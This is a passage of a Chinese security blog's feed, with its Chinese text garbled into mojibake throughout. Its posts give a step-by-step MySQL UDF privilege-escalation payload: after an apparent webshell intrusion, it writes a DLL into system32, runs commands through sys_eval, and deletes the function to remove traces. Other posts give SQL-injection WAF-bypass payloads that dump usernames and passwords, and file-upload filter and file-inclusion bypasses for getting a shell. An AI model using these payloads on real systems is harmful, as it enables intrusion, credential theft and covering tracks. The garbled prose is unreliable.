href="#one">åé¢ä¼šè¯´</a>ï¼‰</p></blockquote><p>åˆ©ç”¨æ¡ä»¶ï¼ˆå…¶å®è¿˜æ˜¯æ¯”è¾ƒè‹›åˆ»çš„ï¼‰</p><blockquote><p>æ•°æ®åº“ç”¨æˆ·æƒé™ä¸ºroot</p><p>æœ‰å†™å…¥åˆ é™¤æƒé™</p></blockquote><h1 id="æˆ˜æ–—å¼€å§‹"><a href="#æˆ˜æ–—å¼€å§‹" class="headerlink" title="æˆ˜æ–—å¼€å§‹"></a>æˆ˜æ–—å¼€å§‹</h1><p>å…ˆæŠŠ<span id="one">payload</span>è´´å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">select version()//æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">select current_user()//æŸ¥çœ‹å½“å‰æ•°æ®åº“ç”¨æˆ·</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;secure_file_priv&#x27;//æŸ¥çœ‹æ˜¯å¦å†™å…¥æƒé™</span><br><span class="line"></span><br><span class="line">select @@basedir//æŸ¥çœ‹å®‰è£…ç›®å½•</span><br><span class="line"></span><br><span class="line">show variables like &quot;%plugin%&quot;//æŸ¥çœ‹pluginç›®å½•ä½ç½®</span><br><span class="line"></span><br><span class="line">select &#x27;#anything&#x27; into outfile &#x27;C:/phpstudy/mysql/lib::$INDEX_ALLOCATION&#x27;//åˆ›å»ºç›®å½•ï¼ˆpluginç›®å½•åŒç†ï¼‰,ä½†æ˜¯è¿™é‡Œæˆ‘ä»æ¥å°±æ²¡æˆåŠŸè¿‡</span><br><span class="line"></span><br><span class="line">create table udf_ed(vital longblob);//åˆ›å»ºè¡¨</span><br><span class="line"></span><br><span class="line">insert into ed_udf values(load_file(&#x27;C:/Inetpub/wwwroot/udf_ed.dll&#x27;));//å†™å…¥æ•°æ®</span><br><span class="line"></span><br><span class="line">select vital from ed_udf into dumpfile &#x27;C:/WINDOWS/system32/udf_ed.dll&#x27;;//å¯¼å‡ºdllæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &quot;udf_ed.dll&quot;//åˆ›å»ºå‡½æ•°</span><br><span class="line"></span><br><span class="line">select * from func;//æŸ¥è¯¢å‡½æ•°æ˜¯å¦åˆ›å»ºæˆåŠŸ</span><br><span class="line"></span><br><span class="line">select sys_eval(&#x27;ipconfig&#x27;);//è°ƒç”¨å‘½ä»¤</span><br><span class="line"></span><br><span class="line">drop function sys_eval;//åˆ é™¤ç—•è¿¹</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ–‡ä»¶ä¸Šä¼ æ‹¿åˆ°webshellåå‘ç°æ˜¯ä¸ªä½æƒé™ï¼Œcmdå‘½ä»¤éƒ½æ‰§è¡Œä¸äº†</p><p><img src="/../images/image-20221012111438103.png" alt="image-20221012111438103"></p><p>é¡ºä¾¿ç¿»ç¿»å‘ç°äº†ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œè·å¾—æ•°æ®åº“å¯†ç ï¼Œè¿™ä¹Ÿå‘Šè¯‰æˆ‘ä»¬ä¿¡æ¯æ”¶é›†æ— è®ºåœ¨ä½•æ—¶ä½•åˆ»éƒ½å¾ˆé‡è¦</p><p><img src="/../images/image-20221012111613062.png" alt="image-20221012111613062"></p><p>è¿æ¥æ•°æ®åº“åç¬¬ä¸€ä»¶äº‹è¿˜æ˜¯ä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹æ•°æ®åº“çš„ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯5.0çš„ï¼ˆæ‰€ä»¥åé¢è¦ä¸Šä¼ çš„ç›®å½•å°±æ˜¯C:\windows\system32ï¼‰</p><p><img src="/../images/image-20221012180105347.png" alt="image-20221012180105347"></p><p>æ¥ä¸‹æ¥æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼Œæ˜¯ä¸ªrootæƒé™ ğŸ‘</p><p><img src="/../images/image-20221012180127633.png" alt="image-20221012180127633"></p><p>å†çœ‹çœ‹æœ‰æ²¡æœ‰å¯¹æˆ‘ä»¬å¯¼å…¥å¯¼å‡ºçš„æƒé™åšé™åˆ¶ï¼Œå‘ç°å¹¶æ²¡æœ‰ã€‚è‡³æ­¤UDFææƒçš„æ¡ä»¶å®Œå…¨æ»¡è¶³ï¼Œå¼€å§‹å¹²æ­£äº‹ã€‚</p><p><img src="/../images/image-20221012180240045.png" alt="image-20221012180240045"></p><p>æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„æ“ä½œä½æ•°ï¼Œå› ä¸ºåé¢è¦ä¸Šä¼ çš„dllæ–‡ä»¶è¦ä¸æœºå™¨çš„æ“ä½œä½æ•°ç›¸åŒ</p><p><img src="/../images/image-20221013094352205.png" alt="image-20221013094352205"></p><p>æŠŠæˆ‘ä»¬çš„dllæ–‡ä»¶éšä¾¿ä¸Šä¼ åˆ°ä¸€ä¸ªèƒ½ä¸Šä¼ çš„è·¯å¾„ï¼Œè¿™é‡Œæˆ‘ä¸Šä¼ åˆ°äº†C:&#x2F;Inetpub&#x2F;cms&#x2F;ç›®å½•ä¸‹</p><p><img src="/../images/image-20221012180738448.png" alt="image-20221012180738448"></p><p>å†æ¬¡è¿›å…¥æ•°æ®åº“ï¼Œåˆ›å»ºä¸€å¼ è¡¨ï¼Œè¡¨åéšæ„ï¼Œå­—æ®µéšæ„ï¼Œæ•°æ®ç±»å‹è¦ä¸ºlongblobï¼ˆäºŒè¿›åˆ¶å¤§å¯¹è±¡ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥å­˜å‚¨äºŒè¿›åˆ¶æ–‡ä»¶çš„å®¹å™¨ï¼‰</p><p><img src="/../images/image-20221012180434905.png" alt="image-20221012180434905"></p><p>é€šè¿‡load_fileè¯»å–æˆ‘ä»¬ä¸Šä¼ çš„dllæ–‡ä»¶ï¼ŒæŠŠå†…å®¹æ’å…¥è¡¨ä¸­</p><p><img src="/../images/image-20221012180936689.png" alt="image-20221012180936689"></p><p>è¿™é‡ŒæŸ¥è¯¢è¡¨å†…çš„å†…å®¹ï¼Œé€šè¿‡dumpfileä»¥äºŒè¿›åˆ¶çš„å½¢å¼å¯¼å‡ºåˆ°c:&#x2F;windows&#x2F;system32&#x2F;ç›®å½•ä¸‹ï¼Œå‘½åä¸ºudf_test.dll</p><p><img src="/../images/image-20221012181236595.png" alt="image-20221012181236595"></p><p>é€šè¿‡åˆšåˆšä»è¡¨å†…å¯¼å‡ºçš„dllæ–‡ä»¶åˆ›å»ºå‡½æ•°</p><p><img src="/../images/image-20221012181351806.png" alt="image-20221012181351806"></p><p>å·²ç»åˆ›å»ºæˆåŠŸäº†</p><p><img src="/../images/image-20221012181503590.png" alt="image-20221012181503590"></p><p>è‡³é«˜æ— ä¸Šçš„systemæƒé™ï¼Œè‡ªæ­¤å°±å¯ä»¥è¿›è¡Œæ„‰å¿«çš„åæ¸—é€äº†ğŸ˜‹</p><p><img src="/../images/image-20221012181535070.png" alt="image-20221012181535070"></p><p><img src="/../images/image-20221012200747527.png" alt="image-20221012200747527"></p><p><img src="/../images/image-20221012200812304.png" alt="image-20221012200812304"></p><p><img src="/../images/image-20221012200906543.png" alt="image-20221012200906543"></p><p><img src="/../images/image-20221012200927278.png" alt="image-20221012200927278"></p><p>åˆ é™¤å‡½æ•°</p><p><img src="/../images/image-20221012201845133.png" alt="image-20221012201845133"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
            <tag> MYSQL </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»mysqlæ•°æ®åº“å¼€å§‹å­¦ä¹ sqlæ³¨å…¥</title>
      <link href="/2022/07/04/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/07/04/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<hr><span id="more"></span><h1 id="mysqlæ•°æ®åº“çš„ä¸€äº›é…ç½®"><a href="#mysqlæ•°æ®åº“çš„ä¸€äº›é…ç½®" class="headerlink" title="mysqlæ•°æ®åº“çš„ä¸€äº›é…ç½®"></a>mysqlæ•°æ®åº“çš„ä¸€äº›é…ç½®</h1><p>æŸ¥çœ‹mysqlè‡ªåŠ¨ç”Ÿæˆå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#x27;password&#x27; /var/log/mysqld.log  </span><br></pre></td></tr></table></figure><p>ä¿®æ”¹mysqlå¯†ç ç­–ç•¥</p><p>ä¸´æ—¶æœ‰æ•ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹ç­–ç•¥ä¸º0</span><br><span class="line"></span><br><span class="line">set global validate_password_policy=0;</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹å¯†ç é•¿åº¦</span><br><span class="line"></span><br><span class="line">set global validate_password_length=1;</span><br></pre></td></tr></table></figure><p>æ°¸ä¹…ç”Ÿæ•ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">validate_password_policy=0</span><br><span class="line">validate_password_length=1</span><br></pre></td></tr></table></figure><h1 id="mysqlæ•°æ®åº“"><a href="#mysqlæ•°æ®åº“" class="headerlink" title="mysqlæ•°æ®åº“"></a>mysqlæ•°æ®åº“</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#ç™»å½•mysql</span><br><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºæ•°æ®åº“ é»˜è®¤ç¼–ç ä¸º utf8</span><br><span class="line"></span><br><span class="line">create database % default charset=utf8;</span><br><span class="line"></span><br><span class="line">#è¿›å…¥æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">use %;</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æ‰€åœ¨æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">select database();</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºæ•°æ®è¡¨t1</span><br><span class="line"></span><br><span class="line">create table t1(id int,user char(5)) default charset=utf8;</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è¡¨</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è¡¨å†…å­—æ®µ</span><br><span class="line"></span><br><span class="line">desc è¡¨å;</span><br><span class="line"></span><br><span class="line">#å•æ¡æ·»åŠ æ•°æ®</span><br><span class="line"></span><br><span class="line">insert into t1 (id,user) values (1,&#x27;tom&#x27;),(2,&#x27;jerry&#x27;);</span><br><span class="line"></span><br><span class="line">#æŸ¥è¯¢è¡¨å†…æ•°æ®</span><br><span class="line">select * from t1;</span><br><span class="line"></span><br><span class="line">#ä¿®æ”¹uid=2çš„æ•°æ®</span><br><span class="line">updata stu set uname=&#x27;max&#x27; where uid=2;</span><br><span class="line"></span><br><span class="line">#åˆ é™¤æ•°æ®</span><br><span class="line">delete from è¡¨å where æ¡ä»¶;</span><br><span class="line"></span><br><span class="line">#åˆ é™¤æŒ‡å®šè¡¨</span><br><span class="line">drop table è¡¨å;</span><br><span class="line"></span><br><span class="line">#åˆ é™¤æŒ‡å®šæ•°æ®åº“</span><br><span class="line">drop database åº“å;</span><br><span class="line"></span><br><span class="line">#æ•°æ®ç±»å‹</span><br><span class="line">#å˜é•¿å­—ç¬¦varchar()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#å­—æ®µçº¦æŸ</span><br><span class="line"></span><br><span class="line">#æ— ç¬¦å· unsigned  </span><br><span class="line">#å­—èŠ‚å®½åº¦ int(4)</span><br><span class="line">#å‰å¯¼é›¶å¡«å…… zerofill</span><br><span class="line">#ä¸»å…³é”®å­— prinmary key </span><br><span class="line">#è‡ªå¢ auto_increment</span><br><span class="line">#é»˜è®¤å€¼ default</span><br><span class="line">#å¤šé€‰ä¸€ enum</span><br><span class="line">#å¤šé€‰å¤š set</span><br><span class="line"></span><br><span class="line">#æŸ¥è¯¢è¯­å¥</span><br><span class="line">#æ¡ä»¶æŸ¥è¯¢where</span><br><span class="line">select *from t1;</span><br><span class="line">select  uname from t1;</span><br><span class="line">select concat(uname,age,sex) from t1;</span><br><span class="line">select *from stu where uid not in (1,2,18);</span><br><span class="line">select classid ,count(*)from stu group by classid;</span><br><span class="line">select classid,count(*) from stu group by classid having count(*)&gt;20;</span><br><span class="line"></span><br><span class="line">select *from t1 where uname like &#x27;è°¢%&#x27;;</span><br><span class="line">select *from t1 where uname like &#x27;%å‰‘%&#x27;;</span><br><span class="line">select *from t1 where uname like &#x27;%__%&#x27;;</span><br><span class="line">select *from t1 where (age&gt;20 and age&lt;30) and sex=&#x27;å¥³&#x27;;</span><br><span class="line"></span><br><span class="line">#å­æŸ¥è¯¢</span><br><span class="line">select * from stu where age=(select max(age)from stu);</span><br></pre></td></tr></table></figure><h1 id="sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"><a href="#sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°" class="headerlink" title="sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"></a>sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°</h1><p>version () æ•°æ®åº“ç‰ˆæœ¬</p><p>database() æ•°æ®åº“å</p><p>user() ç”¨æˆ·å</p><p>current_user() å½“å‰ç”¨æˆ·å</p><p>system_user() ç³»ç»Ÿç”¨æˆ·å</p><p>@@datadir æ•°æ®åº“è·¯å¾„</p><p>@@version_compile_os æ“ä½œç³»ç»Ÿ</p><p>@@version æ•°æ®åº“ç‰ˆæœ¬</p><h1 id="sqlè¯­å¥å†™shell"><a href="#sqlè¯­å¥å†™shell" class="headerlink" title="sqlè¯­å¥å†™shell"></a>sqlè¯­å¥å†™shell</h1><p>æ•°æ®åº“</p><p>select 1,load_file(â€˜C:&#x2F;2.txtâ€™)     #è¯»å–æ–‡ä»¶</p><p>select â€˜ â€˜ into outfile â€˜ â€˜</p><p>select â€˜ â€˜ into dumpfile â€˜ â€˜</p><p>ceil( ) å‘ä¸Šå–æ•´</p><p>floor( ) å‘ä¸‹å–æ•´</p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‰“ç‹—æ£æ³•</title>
      <link href="/2022/05/06/%E6%89%93%E7%8B%97%E6%A3%8D%E6%B3%95/"/>
      <url>/2022/05/06/%E6%89%93%E7%8B%97%E6%A3%8D%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»¥ä¸‹å†…å®¹æµ‹è¯•ä¸ºpikachué¶åœº"><a href="#ä»¥ä¸‹å†…å®¹æµ‹è¯•ä¸ºpikachué¶åœº" class="headerlink" title="ä»¥ä¸‹å†…å®¹æµ‹è¯•ä¸ºpikachué¶åœº"></a><strong>ä»¥ä¸‹å†…å®¹æµ‹è¯•ä¸ºpikachué¶åœº</strong></h1><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C 2 %23</p><p>kobe%27+order++%2F<em>90000aaa</em>%2F%2F*%2190000aaa*%2F%2F*%2190000aaa*%2F+%23%0aby+%2F*%2190000aaa*%2F1%23</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    database(&#x2F;<em>%!a</em>&#x2F;)</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    group_concat(column_name) from information_schema.columns where table_name&#x3D;â€™usersâ€™</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;username%2C password from (users)</p><p>åé¢åº”è¯¥è¿˜ä¼šå†æ›´æ–°</p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlæ³¨å…¥:wafç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2022/03/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/03/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»»æ„ä¸Šä¼ "><a href="#ä»»æ„ä¸Šä¼ " class="headerlink" title="ä»»æ„ä¸Šä¼ "></a>ä»»æ„ä¸Šä¼ </h2><p>è¾¹ç¼˜èµ„äº§çš„ç‰ˆæœ¬ä¸€èˆ¬éƒ½å¾ˆä½ï¼Œæ‰€æœ‰æ™®éå­˜åœ¨ä»»æ„ä¸Šä¼ </p><p>ç›®æ ‡èµ„äº§å¾ˆå®‰å…¨æ²¡æœ‰å­åŸŸåã€æ²¡æœ‰è¾¹ç¼˜èµ„äº§æ—¶ï¼Œå¯ä»¥ä»æ—ç«™å…¥æ‰‹</p><p>è¿›å…¥ç½‘ç«™åå°åï¼Œé¦–å…ˆä»æ¨¡æ¿ã€æ¨¡å—ç­‰åœ°æ–¹ä¸‹æ‰‹ï¼Œæœ€åæ‰è€ƒè™‘ç¼–è¾‘å™¨</p><p>ç™½åå•æ— æ³•ç›´æ¥ä¸Šä¼ è§£æï¼Œåªèƒ½é…åˆæ–‡ä»¶åŒ…å«æ¥ä½¿ç”¨</p><p>æœ¨é©¬è¦ä¸ç½‘ç«™ç¼–å†™çš„è„šæœ¬è¯­è¨€ç›¸åŒï¼Œaspxç¼–å†™çš„å¯ä»¥æ”¯æŒaspçš„é©¬ï¼Œä½†æ˜¯aspxçš„æƒé™å¤§ä¸€ç‚¹</p><p>getshellåï¼Œè‹¥å¯¹æ–¹æ•°æ®åº“ä¸ºmssqlã€mysqlã€oracle,è¿˜å¯ä»¥ç›´æ¥å¯¹æ•°æ®åº“æ–‡ä»¶è¿›è¡Œæ“ä½œ</p><p>æŠ“åŒ…æ‰¾ä¸åˆ°ä¸Šä¼ æ–‡ä»¶åœ°å€å¯ä»¥æ£€æŸ¥å…ƒç´ çœ‹æœ‰æ²¡æœ‰ï¼›ä¸€èˆ¬ä¼šå›æ˜¾å›¾ç‰‡ï¼Œè¿™æ—¶å¯ä»¥å³é”®æŸ¥çœ‹é“¾æ¥è·å–åœ°å€</p><h2 id="è½»é‡çº§æ£€æµ‹çš„ç»•è¿‡ä¸Šä¼ "><a href="#è½»é‡çº§æ£€æµ‹çš„ç»•è¿‡ä¸Šä¼ " class="headerlink" title="è½»é‡çº§æ£€æµ‹çš„ç»•è¿‡ä¸Šä¼ "></a>è½»é‡çº§æ£€æµ‹çš„ç»•è¿‡ä¸Šä¼ </h2><p>ç»•è¿‡JavaScriptå¯¹æ–‡ä»¶åç¼€çš„æ£€æµ‹ï¼ˆæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€ï¼‰</p><p>ç»•è¿‡åç«¯å¯¹è¯·æ±‚åŒ…MIMEç±»å‹çš„æ£€æµ‹ï¼ˆæŠ“åŒ…ä¿®æ”¹Content-Typeå­—æ®µå†…å®¹ï¼‰</p><p>ç»•è¿‡æ–‡ä»¶å¹»æ•°å¤´çš„æ£€æµ‹ï¼ˆgif-&gt;GIF89Aï¼›jpg-&gt;JFIFï¼›png-&gt;%PNGï¼‰</p><h2 id="é»‘åå•ä¸Šä¼ "><a href="#é»‘åå•ä¸Šä¼ " class="headerlink" title="é»‘åå•ä¸Šä¼ "></a>é»‘åå•ä¸Šä¼ </h2><h3 id="æ„é€ ç‰¹æ®Šæ–‡ä»¶å"><a href="#æ„é€ ç‰¹æ®Šæ–‡ä»¶å" class="headerlink" title="æ„é€ ç‰¹æ®Šæ–‡ä»¶å"></a>æ„é€ ç‰¹æ®Šæ–‡ä»¶å</h3><blockquote><p>åŸºäºwindowsç³»ç»Ÿç‰¹æ€§ï¼š. . .ï¼ˆç‚¹ç©ºæ ¼ç‚¹ï¼‰ ::$DATA ï¼ˆåœ¨windowsé‡Œä¼šè¯†åˆ«æˆç©ºæ ¼ï¼‰å¤§å°å†™ç»•è¿‡</p><p>åŸºäºä»£ç å±‚é¢ï¼šåŒå†™ç»•è¿‡ï¼Œç‰¹æ®Šæ–‡ä»¶åphpï¼ˆ.php5|.php4|.php3|.php2|.php1|.html|.htm|.phtml|.pht|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|.pHp1|ï¼‰ aspï¼ˆ.asa|.cer|.cdxï¼‰</p></blockquote><h3 id="åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶"><a href="#åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶" class="headerlink" title="åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶"></a>åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶</h3><p>.htaccessï¼ˆåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼‰ï¼Œç”¨æ¥ç®¡ç†ç›®å½•çš„ã€‚ä¼šæŠŠç›¸åº”å¼€å¤´çš„æ–‡ä»¶å½“ä½œç›¸åº”åç¼€æ¥è§£æï¼ˆé’ˆå¯¹apache,phpï¼‰å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>&lt;FilesMatch â€œxxâ€&gt; </p><p>SetHanler application&#x2F;x-httpd-php</p><p>&lt; FilesMatch &gt; </p></blockquote><p>ä½œä¸ºå±€éƒ¨å˜é‡ä½œç”¨æ–‡ä»¶æˆåŠŸçš„å‰ææ¡ä»¶:<br>(httpd.exe)å¼€å¯:</p><ul><li>Allow Override All</li><li>LoadModule rewrite_module modules&#x2F;mod_rewrite.so</li></ul><h2 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h2><p>ä¸»è¦åˆ©ç”¨PHPæ–‡ä»¶åŒ…å«ä»¥åŠä¼ªåè®®</p><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p><strong>å››ä¸ªå‡½æ•°åŒ…å«å‡½æ•°</strong>ï¼Œincludeã€include_onceã€requireã€require_once</p><p><strong>ä¸¤ä¸ªæ–‡ä»¶è¯»å–å‡½æ•°</strong>ï¼Œfopenã€file_get_contents</p><p>include()å½“ä½¿ç”¨è¯¥å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ°include()å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œ<br>include_once()åŠŸèƒ½å’Œinclude()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡<br>require()åªè¦ç¨‹åºä¸€æ‰§è¡Œå°±ä¼šç«‹å³è°ƒç”¨æ–‡ä»¶,å‘ç”Ÿé”™è¯¯çš„æ—¶å€™ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œ<br>require_once()å®ƒçš„åŠŸèƒ½ä¸require()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡</p><p>fopenä¸file_get_contentséƒ½åªèƒ½è¯»å–æ–‡ä»¶ï¼Œå¹¶ä¸èƒ½æ‰§è¡Œ</p><p><strong>tips:</strong></p><ul><li>åˆ©ç”¨æ–‡ä»¶åŒ…å«è¿˜å¯ä»¥è¯»å–ç½‘ç«™æºç åŠé…ç½®æ–‡ä»¶å’Œå…¶ä»–ä¸œè¥¿</li><li>åŒ…å«æ—¥å¿—æ–‡ä»¶GetShell</li><li>åŒ…å«sessionæ–‡ä»¶GetShell</li></ul><h4 id="æœ¬åœ°åŒ…å«ã€è¿œç¨‹åŒ…å«"><a href="#æœ¬åœ°åŒ…å«ã€è¿œç¨‹åŒ…å«" class="headerlink" title="æœ¬åœ°åŒ…å«ã€è¿œç¨‹åŒ…å«"></a>æœ¬åœ°åŒ…å«ã€è¿œç¨‹åŒ…å«</h4><p>å½“è¢«åŒ…å«çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨æœ¬åœ°æ—¶ï¼Œå°±å½¢æˆçš„æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æœ¬åœ°åŒ…å«å¯¹ç›®æ ‡ç¯å¢ƒé…ç½®æ²¡æœ‰ä»»ä½•è¦æ±‚</p><p>è¿œç¨‹åŒ…å«å½¢æˆåŸå› ä¸æœ¬åœ°åŒ…å«å½¢æˆåŸå› ä¸€è‡´ï¼Œå½“ç›®æ ‡php.ini é…ç½®ä¸­ allow_url_fopen&#x3D;onï¼Œallow_url_include&#x3D;on æ—¶ï¼ŒåŒ…å«çš„æ–‡ä»¶å°±å¯ä»¥æ˜¯å…¶ä»–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶</p><blockquote><p>index.php?file&#x3D;<a href="https://baidu.com/index.php">https://baidu.com/index.php</a></p></blockquote><h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h3><p><strong>tips:</strong></p><ul><li>Base64ç¼–ç åä¸è¦æœ‰+å·ï¼Œä¼šè¢«urlè§£ç ä¸ºç©ºæ ¼</li></ul><h4 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" 